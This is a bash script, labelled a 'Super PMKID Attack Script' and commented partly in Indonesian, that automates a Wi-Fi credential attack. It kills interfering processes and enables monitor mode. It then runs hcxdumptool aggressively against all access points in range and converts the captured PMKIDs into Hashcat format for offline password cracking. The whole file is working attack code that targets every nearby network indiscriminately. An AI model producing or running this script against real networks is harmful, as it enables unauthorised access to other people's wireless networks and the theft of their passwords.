#!/bin/bash

# Super PMKID Attack Script
# Developed for enhanced capture on modern routers
# Usage: sudo bash super_pmkid.sh [interface]

INTERFACE=$1

if [ -z "$INTERFACE" ]; then
    echo "Usage: sudo bash super_pmkid.sh <interface>"
    echo "Example: sudo bash super_pmkid.sh wlan0"
    exit 1
fi

echo "[*] Killing interfering processes..."
sudo airmon-ng check kill

echo "[*] Starting Monitor Mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE
# Validasi nama interface baru (biasanya nambah 'mon')
MON_IFACE="${INTERFACE}mon"

# Cek apakah wlan0mon ada, jika tidak pakai wlan0 standard
if ! ip link show "$MON_IFACE" > /dev/null 2>&1; then
    MON_IFACE="$INTERFACE"
fi

echo "[*] Interface active: $MON_IFACE"
echo "[*] Starting Aggressive PMKID Capture (hcxdumptool)..."
echo "    > Target: ALL Assess Points"
echo "    > Timeout: 10 minutes (Press Ctrl+C to stop earlier)"
echo "    > Method: Active Beacon + Status"

# Command HCXDUMPTOOL Agresif
# -i : Interface
# -w : Output file
# --enable_status=1 : Status message
# (Note: Syntax bisa berbeda tergantung versi hcxdumptool di Kali)

# Coba deteksi versi atau gunakan syntax umum
if hcxdumptool --help | grep -q "rcascan"; then
    # Syntax v6.x (Terbaru)
    sudo hcxdumptool -i $MON_IFACE -w pmkid_super.pcapng --rcascan=active
else
    # Syntax v5.x (Lama)
    sudo hcxdumptool -i $MON_IFACE -o pmkid_super.pcapng --enable_status=1
fi

echo ""
echo "[*] Capture finished."
echo "[*] Converting to Hashcat format..."

if [ -f "pmkid_super.pcapng" ]; then
    hcxpcapngtool -o hash_pmkid.hc22000 -E essid_list.txt pmkid_super.pcapng
    echo ""
    echo "[SUCCESS] Hash saved to: hash_pmkid.hc22000"
    echo "[INFO] Detected Networks:"
    cat essid_list.txt
else
    echo "[FAIL] No capture file found."
fi
